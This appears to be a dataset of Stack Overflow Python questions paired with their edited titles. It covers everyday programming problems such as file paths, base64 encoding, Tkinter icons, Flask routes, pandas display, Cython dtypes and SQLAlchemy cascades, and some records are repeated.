Open file in different directory python," I need to open a file from a different directory without using it's path while staying in the current directory.When I execute the below code: I get the error message FileNotFoundError: [Errno 2] No such file or directory: because it's in a sub directory.Question: Is there an os command I can use that will locate and open the file in sub_dir?Thanks! -let me know if this is a repeat, I searched and couldn't find one but may have missed it. <code>  for file in os.listdir(sub_dir): f = open(file, ""r"") lines = f.readlines() for line in lines: line.replace(""dst="", "", "") line.replace(""proto="", "", "") line.replace(""dpt="", "", "")",Open all files in different directory python
Python Indexing with List of Indices to Exclude," This is similar to some other questions (Explicitly select items from a Python list or tuple, Grabbing specific indices of a list in Python), but I'm looking to do the opposite:What is a clean way to specify a list/tuple of indices to exclude, instead of to select? I'm thinking of something similar to R or MATLAB where you can specify indices to exclude, like: Is there a good way to accomplish the same thing in Python? Apologizes if this is a dupe, I wasn't sure exactly what to search for. <code>  vector1 <- c('a', 'b', 'c', 'd')vector2 <- vector1[-1] # ['b', 'c', 'd']vector3 <- vector1[c(-1, -2)] # ['c', 'd']",Indexing with List of Indices to Exclude
Python: truth value of python string," boolean has to be either True or False.then why output:yesi didn't get why yes is printing , since ""poi"" is nether True or False. <code>  if <boolean> : # do this if ""poi"": print ""yes""",Truth value of a string in python
How to check if an object is a list of strings? python," How to check if an object is a list of strings? I could only check if an object is string as such: Desired output: <code>  def checktype(obj): if isinstance(obj,str): print ""It's a string""obj1 = ['foo','bar','bar','black','sheet']obj2 = [1,2,3,4,5,'bar']obj3 = 'bar'for i in [obj1,obj2,obj3]: checktype(i) It's a list of stringsIt's not a list of strings or a single stringIt's a single string",Python: Check if an object is a list of strings
How to check if an object is a list of strings?," How to check if an object is a list of strings? I could only check if an object is string as such: Desired output: <code>  def checktype(obj): if isinstance(obj,str): print ""It's a string""obj1 = ['foo','bar','bar','black','sheet']obj2 = [1,2,3,4,5,'bar']obj3 = 'bar'for i in [obj1,obj2,obj3]: checktype(i) It's a list of stringsIt's not a list of strings or a single stringIt's a single string",Python: Check if an object is a list of strings
Creating a new text file with python?," This function doesn't work and raises an error. Do I need to change any arguments or parameters?  <code>  import sysdef write(): print('Creating new text file') name = input('Enter name of text file: ')+'.txt' # Name of text file coerced with +.txt try: file = open(name,'r+') # Trying to create a new file or open one file.close() except: print('Something went wrong! Can\'t tell what?') sys.exit(0) # quit Pythonwrite()",Error when creating a new text file with python?
Python 3 Tkinter set window Icon - Windows 7," When I tried to change the window icon in the top left corner from the ugly red ""TK"" to my own favicon using the code below, Python threw an error: This should set the icon to 'favicon.ico' (according to a lot of forum posts all over the web). But unfortunately, all this line does is throw the following error: What I already did:I checked the path - everything is 100% correctI tried other file formats like .png or .bmp - none workedI looked this problem up on many websitesAnd for the third point, effbot.org, my favorite site about Tkinter, told me that Windows ignores the iconbitmap function.But this doesn't explain why it throws an error!There are some ""hackish"" ways to avoid that issue, but none of them are Written for Python 3.x.So my final question is: Is there a way to get a custom icon using Python 3.x and Tkinter?Also, don't tell me I should use another GUI Library. I want my program to work on every platform. I also want a coded version, not a py2exe or sth solution. <code>  from tkinter import *root = Tk()#some buttons, widgets, a lot of stuffroot.iconbitmap('favicon.ico') Traceback (most recent call last): File ""d:\ladvclient\mainapp.py"", line 85, in <module> root.iconbitmap(bitmap='favicon.ico') File ""C:\Python33\lib\tkinter\__init__.py"", line 1637, in wm_iconbitmap return self.tk.call('wm', 'iconbitmap', self._w, bitmap)_tkinter.TclError: bitmap ""favicon.ico"" not defined",Why isn't .ico file defined when setting window's icon?
Set window icon," When I tried to change the window icon in the top left corner from the ugly red ""TK"" to my own favicon using the code below, Python threw an error: This should set the icon to 'favicon.ico' (according to a lot of forum posts all over the web). But unfortunately, all this line does is throw the following error: What I already did:I checked the path - everything is 100% correctI tried other file formats like .png or .bmp - none workedI looked this problem up on many websitesAnd for the third point, effbot.org, my favorite site about Tkinter, told me that Windows ignores the iconbitmap function.But this doesn't explain why it throws an error!There are some ""hackish"" ways to avoid that issue, but none of them are Written for Python 3.x.So my final question is: Is there a way to get a custom icon using Python 3.x and Tkinter?Also, don't tell me I should use another GUI Library. I want my program to work on every platform. I also want a coded version, not a py2exe or sth solution. <code>  from tkinter import *root = Tk()#some buttons, widgets, a lot of stuffroot.iconbitmap('favicon.ico') Traceback (most recent call last): File ""d:\ladvclient\mainapp.py"", line 85, in <module> root.iconbitmap(bitmap='favicon.ico') File ""C:\Python33\lib\tkinter\__init__.py"", line 1637, in wm_iconbitmap return self.tk.call('wm', 'iconbitmap', self._w, bitmap)_tkinter.TclError: bitmap ""favicon.ico"" not defined",Why isn't .ico file defined when setting window's icon?
Pyton bytes message argument error," I can't figure out what the 'bytes' method is complaining about. In the code below, i am trying to generate an authentication key for my client and i keep getting this error [1] [1] <code>  import hmacimport hashlibimport base64message = bytes(""Message"", 'utf-8') # errors heresecret = bytes(""secret"", 'utf-8')signature = base64.b64encode(hmac.new(secret, message, digestmod=hashlib.sha256).digest());print(signature) Traceback (most recent call last): File ""API/test/auth-client.py"", line 11, in <module> message = bytes(""Message"", 'utf-8')TypeError: str() takes at most 1 argument (2 given)",Bytes message argument error
Check nested dictionary values in python," For a large list of nested dictionaries, I want to check if they contain or not a key.Each of them may or may not have one of the nested dictionaries, so if I loop this search through all of them raises an error: My solution so far is: But this is a headache, ugly, and probably not very resources effective.Which would be the correct way to do this in the first type fashion, but without raising an error when the dictionary doesnt exist? <code>  for Dict1 in DictionariesList: if ""Dict4"" in Dict1['Dict2']['Dict3']: print ""Yes"" for Dict1 in DictionariesList: if ""Dict2"" in Dict1: if ""Dict3"" in Dict1['Dict2']: if ""Dict4"" in Dict1['Dict2']['Dict3']: print ""Yes""",Check nested dictionary values?
How to encode integer in to base64 string in python," I'm trying to encode an int in to base64, i'm doing that: expected output: 'MQ=='given output: b'AA=='what i'm doing wrong?Edit: in Python 2.7.2 works correctly <code>  foo = 1base64.b64encode(bytes(foo))",Encode string representation of integer to base64 in Python 3
How to encode integer in to base64 string in python 3," I'm trying to encode an int in to base64, i'm doing that: expected output: 'MQ=='given output: b'AA=='what i'm doing wrong?Edit: in Python 2.7.2 works correctly <code>  foo = 1base64.b64encode(bytes(foo))",Encode string representation of integer to base64 in Python 3
Python/Django REST API architecture," I'm trying to build a niche social network like Instagram as a Python/Django application.So the things I need, regarding architecture, are (I guess):REST API (e.g. api.mystagram.com).Public website (www.mystagram.com or mystagram.com).URL shortener (e.g. mystagr.am).Android appiPhone appWindows Phone app...Before this I only built simple to some less-simple websites, but never extremely complex with own custom APIs or so. I have never build my own REST API before (I have used other REST APIs though) or even built an Android/iPhone app and distributed it in the Play Store/App Store (I have made some typical hello world examples though).So, the most important thing to me seems to create a kick-ass REST API first and proceed from there. I am blocked however by a few questions.How should I organize the projects for the public website and REST API? Should these be separate Django projects or should I create only one Django project and add both the public website and REST API as an internal Django module?Should the public website also make use of the REST API? Or is it better to just use the plain Django models for this?Thanks in advance for any help! If somebody knows some great presentations or so on this topic (architecture), always welcome!Kind regards,Kristof <code> ",Python/Django REST API Architecture
Pep8 E501: line too long Error," I get the error E501: line too long from this code: but if I write this way or another way: I get this error: or I get this error: So please tell me, how can I pass this error? <code>  header, response = client.request('https://api.twitter.com/1.1/statuses /user_timeline.json?include_entities=true&screen_name='+username+'&count=1') header, response = client.request('\ https://api.twitter.com/1.1/statuses/user_timeline.\ json?include_entities=true&screen_name='+username+'&count=1') ValueError: Unsupported URL https://api.twitter.com/1.1/statuses/user_timeline .json?include_entities=true&screen_name=username&count=1 (). ValueError: No JSON object could be decoded",Pep8 E501: line too long error
group multi-index pandas dataframe," Is it possible to groupby a multi-index (2 levels) pandas dataframe by one of the multi-index levels ? The only way I know of doing it is to reset_index on a multiindex and then set index again. I am sure there is a better way to do it, and I want to know how.  <code> ",Group a multi-indexed pandas dataframe by one of its levels?
virtualenv won't activate on windows," Essentially I cannot seem to activate my virtualenv environment which I create.I'm doing this inside of Windows PowerShell through using but I get an error message:""cannot be loaded because the execution of scripts is disabled on thissystem"".Could this be because I don't carry administrator privileges on my computer? <code>  scripts\activate",'virtualenv' won't activate on Windows
"Usage of ""provides"" keyword in python's setup.py"," I am working on a fork of a python projet (tryton) which uses setuptools for packaging. I am trying to extend the server part of the project, and would like to be able to use the existing modules with my fork.Those modules are distributed with setuptools packaging, and are requiring the base project for installation.I need a way to make it so that my fork is considered an acceptable requirement for those modules.EDIT : Here is what I used in my setup.py : The modules I want to be able to install have those requirements : As it is, with my package installed, trying to install a module triggers the installation of the trytond package. <code>  from setuptools import setupsetup( ... provides=[""trytond (2.8.2)""], ...) from setuptools import setupsetup( ... install_requires=[""trytond>=2.8""] ...)","Usage of ""provides"" keyword-argument in python's setup.py"
Python Datetime Unix timestamp contains milliseconds," I have a list of unix timestamps that all contain milliseconds -- they are 13 digits long. When I run the timestamp through datetime.fromtimestamp(unix_timestamp) it returns a ValueError: Year Out of Range. When I cut the last three digits off the timestamp and run it through the same format converter, it's works perfectly. Is it possible to run the Unix timestamp that includes milliseconds through the fromtimestamp method of datetime without raising a ValueError? I was looking at the documentation and it didn't say anything about specifying milliseconds.Any help would be awesome! <code> ",Datetime Unix timestamp contains milliseconds
"Trying to use open( filename, 'w' ) gives IOError: [Errno 2] No such file or directory:"," I am trying to create and write to a text file using Python. I have searched and cannot find a solution/reason for this error.Here's the code that doesn't work: Most answers I found related to the slashes in the path, so... When I try to create a file at the root of D:/ I have success. It seems that I can't create the directory path I would like while trying to create the file. What is the correct method for creating files at a specific path with Python on Windows(7)? Am I misunderstanding what open() can do? Does it create directories if they don't exist or do I need to explicitly create the directory path before I use open() in 'write' mode to create a file? <code>  afile = 'D:\\temp\\test.txt'outFile = open(afile, 'w' )outFile.write('Test.')outFile.close()# Error: 2# Traceback (most recent call last):# File ""<maya console>"", line 1, in <module># IOError: [Errno 2] No such file or directory: 'D:\\temp\\test.txt' # I tried 'D:/temp/test.txt' and got an error.I tried r'D:\temp\test.txt' and got an error. 'D:/test.txt' works.'D:\\test.txt' works.r'D:\test.txt' works.","Trying to use open(filename, 'w' ) gives IOError: [Errno 2] No such file or directory if directory doesn't exist"
"Selenium (Python) WebDriver: Firefox starts, but does not open the URL"," I've just installed Selenium for the first time, and I'm having trouble to get started.Installation went fine with pip: And I can import selenium within Python.Now I'm trying to run the following sample script: What happens is that Firefox opens, but it does not navigate to ""http://www.python.org"" (similar to the behaviour described in this question - it only shows a blank page)For about 60 seconds nothing happens, until the following exception raised: These are the software versions Firefox ESR 17.0.5Selenium (Python bindings) 2.35.0 Python 2.6.6Red Had Linux 6.3the ""Firefox WebDriver 2.35.0"" browser extension is installed <code>  pip install selenium from selenium import webdriverdriver = webdriver.Firefox()driver.get(""http://www.python.org"")assert ""Python"" in driver.title Traceback (most recent call last): File ""selenium-test.py"", line 4, in <module> driver = webdriver.Firefox() File ""/home/usr1/.local/lib/python2.6/site-packages/selenium/webdriver/firefox/webdriver.py"", line 61, in __init__ desired_capabilities=capabilities) File ""/home/usr1/.local/lib/python2.6/site-packages/selenium/webdriver/remote/webdriver.py"", line 72, in __init__ self.start_session(desired_capabilities, browser_profile) File ""/home/usr1/.local/lib/python2.6/site-packages/selenium/webdriver/remote/webdriver.py"", line 114, in start_session 'desiredCapabilities': desired_capabilities, File ""/home/usr1/.local/lib/python2.6/site-packages/selenium/webdriver/remote/webdriver.py"", line 165, in execute self.error_handler.check_response(response) File ""/home/usr1/.local/lib/python2.6/site-packages/selenium/webdriver/remote/errorhandler.py"", line 136, in check_response raise exception_class(value)selenium.common.exceptions.WebDriverException: Message: u'<HTML><HEAD>\r\n<TITLE>Network Error</TITLE>\r\n</HEAD>\r\n<BODY>\r\n<FONT face=""Helvetica"">\r\n<big><strong></strong></big><BR>\r\n</FONT>\r\n<blockquote>\r\n<TABLE border=0 cellPadding=1 width=""80%"">\r\n<TR><TD>\r\n<FONT face=""Helvetica"">\r\n<big>Network Error (tcp_error)</big>\r\n<BR>\r\n<BR>\r\n</FONT>\r\n</TD></TR>\r\n<TR><TD>\r\n<FONT face=""Helvetica"">\r\nA communication error occurred: ""Operation timed out""\r\n</FONT>\r\n</TD></TR>\r\n<TR><TD>\r\n<FONT face=""Helvetica"">\r\nThe Web Server may be down, too busy, or experiencing other problems preventing it from responding to requests. You may wish to try again at a later time.\r\n</FONT>\r\n</TD></TR>\r\n<TR><TD>\r\n<FONT face=""Helvetica"" SIZE=2>\r\n<BR>\r\nFor assistance, contact your network support team.\r\n</FONT>\r\n</TD></TR>\r\n</TABLE>\r\n</blockquote>\r\n</FONT>\r\n</BODY></HTML>'","Selenium WebDriver: Firefox starts, but does not open the URL"
Printing an list with hex elements," I have this list: When I print it, I get: But I want:[0x0, 0x0, 0x0, 0x0] or [0x00, 0x00, 0x00, 0x00], it doesn't matter for now.I've tried to create a function such as: But every time the printed message is: I think that the_list.index(element) always returns the first occurrence of element in the_list and not the actual position of the element. Is there a way where I can get the actual position of the element? <code>  a_list = [0x00, 0x00, 0x00, 0x00] print a_list[0, 0, 0, 0] def hex_print(the_list): string = '[' for element in the_list: if(the_list.index(element) < len(the_list)): print(str(the_list.index(element))) string = string + hex(element) + ', ' else: print(str(the_list.index(element))) string = string + hex(element) + ']' print string [0x0, 0x0, 0x0, 0x0,",Printing a Python list with hex elements
Python 'text analyzer'," I'm just getting into Python and I'm building a program that analyzes a group of words and returns how many times each letter appears in the text. i.e 'A:10, B:3, C:5...etc'. So far it's working perfectly except that i am looking for a way to condense the code so i'm not writing out each part of the program 26 times. Here's what I mean..  <code>  print(""Enter text to be analyzed: "")message = input()A = 0b = 0c = 0...etcfor letter in message: if letter == ""a"": a += 1 if letter == ""b"": b += 1 if letter == ""c"": c += 1 ...etcprint(""A:"", a, ""B:"", b, ""C:"", c...etc)",Count number of occurrences of a character in a string
"What part of speech does ""s"" stand for in NLTK synsets"," I have a list of GRE words which I am getting a list of synsets for. For many of the words in the list, I see familiar parts of speech like verbs, nouns, etc. However, I am coming across many words which are classified with ""s"". I can't for the life of me figure out what part of speech ""s"" stands for. The only thing I can think of is that ""s"" stands for ""singular"", but that isn't a part of speech classification. For example, the word ""admonitory"" is an adjective. The two synsets which are returned are ""admonitory.s.01"" and ""admonitory.s.02"". Both list the part of speech as ""s"".I would really appreciate it if someone could explain this to me, or point me in the direction of some good resources where I might find the answer. I have already read through the NLTK documentation on the subject and didn't find the answer there. <code>  for word in words: synsets = wordnet.synsets(word['name']) for synset in synsets: print synset.pos #prints part of speech","What part of speech does ""s"" stand for in WordNet synsets"
What are the best approaches to wait some time in pygame and python code in general?," While I've been using time.wait in my code since I began learning Python and Pygame, I've been wondering if there are any other ways to do it and what are the advantages and disadvantages of each approach. For example, Pygame also has a pygame.time.wait. What's the difference between python's wait and pygame's wait functions? Which one is better? And are there other ways to wait some time besides using these two functions? <code> ",How to wait some time in pygame?
"Python 'string' % [1, 2, 3] doesn't rails TypeError"," Is the exact behavior of the str.__mod__ documented?These two lines of code works just as expected: This line behaves as expected too: But what does this line and why it doesn't raise any error? P. S.  <code>  >>> 'My number is: %s.' % 123'My number is: 123.'>>> 'My list is: %s.' % [1, 2, 3]'My list is: [1, 2, 3].' >>> 'Not a format string' % 123Traceback (most recent call last): File ""<stdin>"", line 1, in <module>TypeError: not all arguments converted during string formatting >>> 'Not a format string' % [1, 2, 3]'Not a format string' >>> print(sys.version)3.3.2 (default, Aug 15 2013, 23:43:52) [GCC 4.7.3]","Python 'string' % [1, 2, 3] doesn't raise TypeError"
Find minimum and maximum values of a function - Python," I have a function and I would like to find its maximum and minimum values. My function is this: I have an interval for x [-1, 1] and y [-1, 1]. I would like to find a way, limited to this interval, to discover the max and min values of this function. <code>  def function(x, y): exp = (math.pow(x, 2) + math.pow(y, 2)) * -1 return math.exp(exp) * math.cos(x * y) * math.sin(x * y)",Find minimum and maximum values of a function
Add a prefix to all Flask routes?," I have a prefix that I want to add to every route. Right now I add a constant to the route at every definition. Is there a way to do this automatically? <code>  PREFIX = ""/abc/123""@app.route(PREFIX + ""/"")def index_page(): return ""This is a website about burritos""@app.route(PREFIX + ""/about"")def about_page(): return ""This is a website about burritos""",Add a prefix to all Flask routes
"Cython Error ""Buffer dtype mismatch, expected 'dtype_t' but got 'long'"""," I've created a Cython code to make matrix operations between a dense matrix and a sparse vector,as follows (as I'm learning Cython I'm not sure this is a good code, but it's the best I could come up with so far): It works fine. But when I change the third line from: to: and compile the .pyx file and run again the matrix operations I get the error: As an example, when compiling using np.float32_t and running the code: Is there a different way to use float32 in Cython? Using float64 and float32 shouldn't work the same way?For what I've researched so far it should work the same, but it didn't in that code.Thanks in advance! <code>  import numpy as npcimport numpy as npctypedef np.float64_t dtype_tctypedef np.int32_t dtypei_tcimport cython@cython.boundscheck(False)@cython.wraparound(False)@cython.nonecheck(False)def cdenseXsparse(np.ndarray[dtype_t, ndim = 2] Y, np.ndarray[dtype_t, ndim = 1] V, np.ndarray[dtypei_t, ndim = 1] I, np.ndarray[dtype_t, ndim = 1] A = None): """""" Computes A = Y * (V_I) """""" if Y is None: raise ValueError(""Input cannot be Null"") A = np.zeros(Y.shape[1]) cdef Py_ssize_t i, indice cdef dtype_t s for i in range(A.shape[0]): s = 0 for indice in range(len(I)): s += Y[I[indice], i] * V[indice] A[i] = s return A ctypedef np.float64_t dtype_t ctypedef np.float32_t dtype_t ""Buffer dtype mismatch, expected 'dtype_t' but got 'long'"" In [3]: from numpy import random as rd, array, int32, float32In [4]: y = array(rd.rand(10, 200), dtype = float32)In [5]: v = array([1, 2, 3], dtype = float32)In [6]: i = array([0, 1, 2], dtype = int32) In [7]: from cdenseXsparse import cdenseXsparseIn [8]: r = cdenseXsparse(y, v, i)---------------------------------------------------------------------------ValueError Traceback (most recent call last)<ipython-input-8-319f9c8c8d49> in <module>()----> 1 r = cdenseXsparse(y, v, i)/home/will/workspace/s3_RecSys/SVD/cdenseXsparse.so in cdenseXsparse.cdenseXsparse (cdenseXsparse.c:1484)()ValueError: Buffer dtype mismatch, expected 'dtype_t' but got 'double'",float64 to float32 Cython Error
"float64 to float32 Error ""Buffer dtype mismatch, expected 'dtype_t' but got 'long'"""," I've created a Cython code to make matrix operations between a dense matrix and a sparse vector,as follows (as I'm learning Cython I'm not sure this is a good code, but it's the best I could come up with so far): It works fine. But when I change the third line from: to: and compile the .pyx file and run again the matrix operations I get the error: As an example, when compiling using np.float32_t and running the code: Is there a different way to use float32 in Cython? Using float64 and float32 shouldn't work the same way?For what I've researched so far it should work the same, but it didn't in that code.Thanks in advance! <code>  import numpy as npcimport numpy as npctypedef np.float64_t dtype_tctypedef np.int32_t dtypei_tcimport cython@cython.boundscheck(False)@cython.wraparound(False)@cython.nonecheck(False)def cdenseXsparse(np.ndarray[dtype_t, ndim = 2] Y, np.ndarray[dtype_t, ndim = 1] V, np.ndarray[dtypei_t, ndim = 1] I, np.ndarray[dtype_t, ndim = 1] A = None): """""" Computes A = Y * (V_I) """""" if Y is None: raise ValueError(""Input cannot be Null"") A = np.zeros(Y.shape[1]) cdef Py_ssize_t i, indice cdef dtype_t s for i in range(A.shape[0]): s = 0 for indice in range(len(I)): s += Y[I[indice], i] * V[indice] A[i] = s return A ctypedef np.float64_t dtype_t ctypedef np.float32_t dtype_t ""Buffer dtype mismatch, expected 'dtype_t' but got 'long'"" In [3]: from numpy import random as rd, array, int32, float32In [4]: y = array(rd.rand(10, 200), dtype = float32)In [5]: v = array([1, 2, 3], dtype = float32)In [6]: i = array([0, 1, 2], dtype = int32) In [7]: from cdenseXsparse import cdenseXsparseIn [8]: r = cdenseXsparse(y, v, i)---------------------------------------------------------------------------ValueError Traceback (most recent call last)<ipython-input-8-319f9c8c8d49> in <module>()----> 1 r = cdenseXsparse(y, v, i)/home/will/workspace/s3_RecSys/SVD/cdenseXsparse.so in cdenseXsparse.cdenseXsparse (cdenseXsparse.c:1484)()ValueError: Buffer dtype mismatch, expected 'dtype_t' but got 'double'",float64 to float32 Cython Error
Beginner Python: Ending an infinite while loop," I currently have code that basically runs an infinite while loop to collect data from users. Constantly updating dictionaries/lists based on the contents of a text file. For reference: Basically, my problem is that I do not know when I want this to end, but after this while loop runs I want to use the information collected, not lose it by crashing my program. Is there a simple, elegant way to simply exit out of the while loop whenever I want? Something like pressing a certain key on my keyboard would be awesome. <code>  while (True): IDs2=UpdatePoints(value,IDs2) time.sleep(10)",Ending an infinite while loop
Hot to generate equispaced interpolating values," I have a list of (x,y) values that are not uniformly spaced. Here is the archive used in this question.I am able to interpolate between the values but what I get are not equispaced interpolating points. Here's what I do: Which results in:As can be seen, the red dots are closer together in sections of the graph where the original points distribution is denser.I need a way to generate the interpolated points equispaced in x, y according to a given step value (say 0.1)As askewchan correctly points out, when I mean ""equispaced in x, y"" I mean that two consecutive interpolated points in the curve should be distanced from each other (euclidean straight line distance) by the same value.I tried unubtu's answer and it works well for smooth curves but seems to break for not so smooth ones:This happens because the code calculates the point distance in an euclidean way instead of directly over the curve and I need the distance over the curve to be the same between points. Can this issue be worked around somehow? <code>  x_data = [0.613,0.615,0.615,...]y_data = [5.919,5.349,5.413,...]# Interpolate values for x and y.t = np.linspace(0, 1, len(x_data))t2 = np.linspace(0, 1, 100)# One-dimensional linear interpolation.x2 = np.interp(t2, t, x_data)y2 = np.interp(t2, t, y_data)# Plot x,y data.plt.scatter(x_data, y_data, marker='o', color='k', s=40, lw=0.)# Plot interpolated points.plt.scatter(x2, y2, marker='o', color='r', s=10, lw=0.5)",How to generate equispaced interpolating values
Is there a way to (pretty) print the entire Pandas Series / DataFrame?," I work with Series and DataFrames on the terminal a lot. The default __repr__ for a Series returns a reduced sample, with some head and tail values, but the rest missing.Is there a builtin way to pretty-print the entire Series / DataFrame? Ideally, it would support proper alignment, perhaps borders between columns, and maybe even color-coding for the different columns. <code> ",Pretty-print an entire Pandas Series / DataFrame
Is there a way to pretty print an entire Pandas Series / DataFrame?," I work with Series and DataFrames on the terminal a lot. The default __repr__ for a Series returns a reduced sample, with some head and tail values, but the rest missing.Is there a builtin way to pretty-print the entire Series / DataFrame? Ideally, it would support proper alignment, perhaps borders between columns, and maybe even color-coding for the different columns. <code> ",Pretty-print an entire Pandas Series / DataFrame
Pretty print an entire Pandas Series / DataFrame," I work with Series and DataFrames on the terminal a lot. The default __repr__ for a Series returns a reduced sample, with some head and tail values, but the rest missing.Is there a builtin way to pretty-print the entire Series / DataFrame? Ideally, it would support proper alignment, perhaps borders between columns, and maybe even color-coding for the different columns. <code> ",Pretty-print an entire Pandas Series / DataFrame
Accessing non-consecutive elements of a list in python," As far as I can tell, this is not officially not possible, but is there a ""trick"" to access arbitrary non-sequential elements of a list by slicing?For example: Now I want to be able to do so that a == 20 and b == 50One way besides two statements would be something silly like: But that doesn't scale at all to irregular intervals.Maybe with list comprehension using the indices I want? I would love to know what is recommended for this common problem. <code>  >>> L = range(0,101,10)>>> L[0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100] a,b = L[2,5] a,b = L[2:6:3][:2] [L[x] for x in [2,5]]",Accessing non-consecutive elements of a list or string in python
Rendering a python dict in Jinja2 / Werkzeug," I'm playing with a url shortener (basing it on the Shortly demo app from Werkzeug).I have a dict like this - which is returned in url_list and used by render_template the template list_urls is pretty simple - Thing is, I can't seem to access the items in the dict.The line is where I'm focussing attention. As above, I get a list of the keys in the dict. returns nothing. None of the{{ user.url }}"">{{ user.username }}type stuff in the docs seems to work.Ideas please? Newbie - be gentle. Thanks.UpdateThanks for the responses.Ewan's answer works, but uses a list of dicts. I want to pass a dict and render that (because I want a non-integer index of items). Does Jinja do that?Also - I mis-represented url_list. It's more like this - Further experimentation - passing a dict produces an error about a list object. UndefinedError: 'list object' has no attribute 'iteritems'Thanks again.Still baffled by why it thought I was passing a list but got it working now. prints out everything. Many thanks. <code>  ('1', {'target': 'http://10.58.48.103:5000/', 'clicks': '1'})('3', {'target': 'http://slash.org', 'clicks': '4'})('2', {'target': 'http://10.58.48.58:5000/', 'clicks': '1'})('5', {'target': 'http://de.com/a', 'clicks': '0'}) def on_list_urls(self, request): url_list = self.get_urls() return self.render_template('list_urls.html', url_list = url_list ) {% extends ""layout.html"" %}{% block title %}List URLs{% endblock %}{% block body %} <h2>List URLs</h2> <ul id=""items""> {% for item in url_list %} <li>{{ item }}</li> {% endfor %} </ul>{% endblock %} <li>{{ item }}</li> <li>{{ item[""target""] }}</li> {'a': {'target': 'http://testing.com/test', 'clicks': '0'}, '1': {'target': 'http://10.58.48.103:5000/', 'clicks': '1'}, '3': {'target': 'http://slash.org', 'clicks': '4'}, '2': {'target': 'http://10.58.48.58:5000/', 'clicks': '1'}} {% for key in url_list.iteritems() %} {% for key, value in url_list.iteritems() %} <li>{{ key }} - {{ value[""target""] }} - {{ value[""clicks""] }}</li>",Rendering a dictionary in Jinja2
Repositories of conda recipes," From what I understand, there are several repositories for conda recipes (not for the program itself):The default one (where does conda look for recipes by default?)The following GitHub repository: https://github.com/ContinuumIO/conda-recipesOther recipe repositories in binstar.orgMy questions are: What is the relationship between them? Is any of them more ""official"" than the others? (in the same way that Pypi is for pip)How can I tell conda to pull packages from the GitHub repository above?Binstar.org, seems to be a hosting service for package repositories. How can I tell conda to search for packages in it? <code> ",Repositories of conda recipes and packages
"defaultdict of defaultdict, nested"," Is there a way to make a defaultdict also be the default for the defaultdict? (i.e. infinite-level recursive defaultdict?)I want to be able to do: So, I can do x = defaultdict(defaultdict), but that's only a second level: There are recipes that can do this. But can it be done simply just using the normal defaultdict arguments?Note this is asking how to do an infinite-level recursive defaultdict, so it's distinct to Python: defaultdict of defaultdict?, which was how to do a two-level defaultdict.I'll probably just end up using the bunch pattern, but when I realized I didn't know how to do this, it got me interested. <code>  x = defaultdict(...stuff...)x[0][1][0]{} x[0]{}x[0][0]KeyError: 0",Nested defaultdict of defaultdict
Python SQL Alchemy cascade delete," My User model has a relationship to the Address model. I've specified that the relationship should cascade the delete operation. However, when I query and delete a user, I get an error that the address row is still referenced. How do I delete the user and the addresses?  <code>  class User(db.Model): id = db.Column(db.Integer, primary_key=True) addresses = db.relationship('Address', cascade='all,delete', backref='user')class Address(db.Model): id = db.Column(db.Integer, primary_key=True) user_id = db.Column(db.Integer, db.ForeignKey(User.id)) db.session.query(User).filter(User.my_id==1).delete() IntegrityError: (IntegrityError) update or delete on table ""user"" violates foreign key constraint ""addresses_user_id_fkey"" on table ""address""DETAIL: Key (my_id)=(1) is still referenced from table ""address"". 'DELETE FROM ""user"" WHERE ""user"".id = %(id_1)s' {'id_1': 1}",SQLAlchemy delete doesn't cascade
Is there a short-hand for nth root of x in Python," In maths, if I wish to calculate 3 to the power of 2 then no symbol is required, but I write the 2 small: 3. In Python this operation seems to be represented by the ** syntax. If I want to go the other direction and calculate the 2nd root of 9 then in maths I need to use a symbol: 29 = 3Is there a short-hand symbol in Python, similar to ** that achieves this i.e. 2<symbol>9? Or do I need to use the math module? <code>  >>> 3**29",Is there a short-hand for nth root of x in Python?
"Is there a short-hand for nth root of x, in Python?"," In maths, if I wish to calculate 3 to the power of 2 then no symbol is required, but I write the 2 small: 3. In Python this operation seems to be represented by the ** syntax. If I want to go the other direction and calculate the 2nd root of 9 then in maths I need to use a symbol: 29 = 3Is there a short-hand symbol in Python, similar to ** that achieves this i.e. 2<symbol>9? Or do I need to use the math module? <code>  >>> 3**29",Is there a short-hand for nth root of x in Python?
Can't display an embedded image in an email in outlook 2013 sent using using python smtplib/email, I have looked at several other posts including:Embed picture in emailSending Multipart html emails which contain embedded imagescreating a MIME email template with images to send with python / djangoThese along with the python docs for smtplib and email have gotten me close. I am using the code below to create an email with a simple jpg embedded in it. If I send the email to gmail it will display the embedded image fine but outlook 2013 will not. I have checked all the download and security settings in Outlook that I can think of and they are fine. I have also added the sender to the safe-sender's list. I am able to receive other emails created with embedded images using conventional tools in outlook fine. From the reading I have been doing and looking at the source of the received email it appears that outlook doesn't know where to find the image. There are no attachments associated with this email either. Below is what I get when I right-click on the email and view the source. I am currently thinking it has something to do with either the content type or I just plain screwed up the code. I think the code is fine as gmail displays the image ok and when I forward it from gmail to outlook the forwarded message is displayed fine. <code>  import smtplibfrom email.MIMEMultipart import MIMEMultipartfrom email.MIMEText import MIMETextfrom email.MIMEImage import MIMEImageFrom = ''To = ''msg = MIMEMultipart()msg['Subject'] = 'image test message'msg['From'] = Frommsg['To'] = Totext = 'This is sample text from me'html = '''<html> <head> <title> this is a test title </title> </head>,Can't display an embedded image in an email in outlook 2013 sent using using python smtplib/email
SOLVED - Can't display an embedded image in an email in outlook 2013 sent using using python smtplib/email, I have looked at several other posts including:Embed picture in emailSending Multipart html emails which contain embedded imagescreating a MIME email template with images to send with python / djangoThese along with the python docs for smtplib and email have gotten me close. I am using the code below to create an email with a simple jpg embedded in it. If I send the email to gmail it will display the embedded image fine but outlook 2013 will not. I have checked all the download and security settings in Outlook that I can think of and they are fine. I have also added the sender to the safe-sender's list. I am able to receive other emails created with embedded images using conventional tools in outlook fine. From the reading I have been doing and looking at the source of the received email it appears that outlook doesn't know where to find the image. There are no attachments associated with this email either. Below is what I get when I right-click on the email and view the source. I am currently thinking it has something to do with either the content type or I just plain screwed up the code. I think the code is fine as gmail displays the image ok and when I forward it from gmail to outlook the forwarded message is displayed fine. <code>  import smtplibfrom email.MIMEMultipart import MIMEMultipartfrom email.MIMEText import MIMETextfrom email.MIMEImage import MIMEImageFrom = ''To = ''msg = MIMEMultipart()msg['Subject'] = 'image test message'msg['From'] = Frommsg['To'] = Totext = 'This is sample text from me'html = '''<html> <head> <title> this is a test title </title> </head>,Can't display an embedded image in an email in outlook 2013 sent using using python smtplib/email
